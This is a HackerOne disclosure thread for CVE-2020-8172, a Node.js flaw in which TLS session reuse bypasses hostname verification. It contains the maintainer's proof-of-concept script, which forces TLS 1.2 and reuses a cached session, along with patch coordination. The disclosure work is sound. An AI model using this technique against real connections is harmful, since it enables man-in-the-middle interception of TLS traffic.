---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/man-in-the-middle
  - env/web
  - stack/node
substate: "resolved"
weakness: "Man-in-the-Middle"
enriched: true
date: 2020-06-03
submitted: 2020-03-05T17:30:12.121Z
bounty_usd: null
votes: 29
cve: "CVE-2020-8172"
program: "[[programs/nodejs|Node.js]]"
reporter: "fwilhelm"
source: "https://hackerone.com/reports/811502"
title: "Node.js: TLS session reuse can lead to hostname verification bypass"
---
# Node.js: TLS session reuse can lead to hostname verification bypass

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 29 | **Program:** Node.js | **Disclosed:** 2020-06-03

- Report: [https://hackerone.com/reports/811502](https://hackerone.com/reports/811502)
- CWE: Man-in-the-Middle | CVE: CVE-2020-8172
- Submitted: 2020-03-05T17:30:12.121Z

## Timeline

- **Report Filed**
- **2020-03-06** @indutny: Hello!

Thank you for the report and your research.

Could you advise us which Node.js version did you find vulnerable to this? I've tried to reproduce it on v12.13.1, but it just doesn't seem to work.

Is it important to use `go` server for reproduction?
- **2020-03-06** @fwilhelm: Hey,

I've tested this with v13.9.0 (which was current when I started looking into this). 

It is important that the repro server runs locally (otherwise the timing is probably wrong) and that it supports session resumption for TLS 1.2 (go does that out of the box, I believe node requires configuring a session store). Other than that there is nothing special about the go server.

Could you paste the script output that you are seeing?
- **2020-03-06** @beagle: Hi @fwilhelm,

Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Kind regards,
@beagle
- **Report Triaged**
- **2020-03-18** @indutny: I can reproduce the issue now using updated `poc.js`:

```
// echo '127.0.0.1 nodejs.org' >> /etc/hosts
// run an https server on localhost:8444 
// serving an CA signed cert for an arbitrary domain
//
// ./node-v13.9.0-linux-x64/bin/node poc.js

const https = require('https');

const options = {
  hostname: 'kubernetes.docker.internal',
  port: 8444,
  path: '/hello',
  method: 'GET',
  // note that this is not required for the bug to work but it makes reproducing it easier.
  secureProtocol: 'TLSv1_2_method'
};


const req = https.request(options, (res) => {
  res.on('data', (d) => {
    assert(0, "First request should always fail in a correct setup")
  });
});

req.on('error', (e) => {
  console.log("[!] First request failed:" + e.reason);
  setImmediate(() => { doit() });
});
req.end();


function doit() {
  console.log("[x] Starting second request");
  console.log("[x] Dumping globalAgent._sessionCache.map:")
  console.log(https.globalAgent._sessionCache.map)

  const req2 = https.request(options, (res) => {
    res.on('data', (d) => {
      console.log("[!] Bypassed hostname verification. Server response: " + res.statusCode)
      console.log(res.headers)
      process.stdout.write(d);
      process.exit(1);
    });
  });

  req2.on('error', (e) => {
    console.log("[-] Second request failed:" + e);
    console.log("[-] Race failed or not vulnerable.")
    process.exit(0);
  });
  req2.end();


}
```

Note the `secureProtocol` option above. The session management is different for TLS1.3 so it is indeed necessary to force it down to at least 1.2 to reproduce the issue.
- **2020-03-18** @indutny: I have a preliminary patch that should fix the issue. Working on the test case for the Node.js test suite.

Sorry for the delay!
- **2020-03-30** @fwilhelm: Hi Fedor,

I hope you are doing well. 
Any updates on this issue? Is there already an estimated date for the patch release? 
Could you send me a copy of the patch so I can take a look? (fwilhelm@google.com).

Thanks.

Best,
Felix
- **2020-03-30** @indutny: Hello Felix,

I've attached the latest patch to this message. Please let me know if you can't access it!

The review is still going on. We will post an update once we'll know the release date!

Thank you for your patience,
Fedor.
- **2020-05-15** @octetcloud: Can someone suggest the text to use for the CVE description? It must match this very specific format: `PROBLEM TYPE` in `PRODUCT/VERSION` causes `IMPACT` when `ATTACK`
- **2020-05-15** @octetcloud: What is suggested CVSS rating for this?
- **2020-05-28** @fwilhelm: Apologies, I missed the updates on this. 
@indutny The patch looks good to me. We are pretty close to the 90 day deadline (2020-06-03), do you plan to release the update before that date? (In case it is necessary, we do offer a 14-day grace extension if a patch is planned to be released within the 2 weeks following the original deadline. )

@octetcloud  Maybe something like "Race Condition in Node.JS XY TLS Session Handling causes hostname verification bypass" for the CVE description? No idea re CVSS rating.
- **2020-05-28** @octetcloud: My apologies, there is a lot of manual notifications and coordinations in our process, and telling all the reporters of the release date is missing from it ATM.

Fix is planned for June 2nd.

Announcement: https://nodejs.org/en/blog/vulnerability/june-2020-security-releases/

It doesn't mention this report specifically of course.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Bounty Awarded**
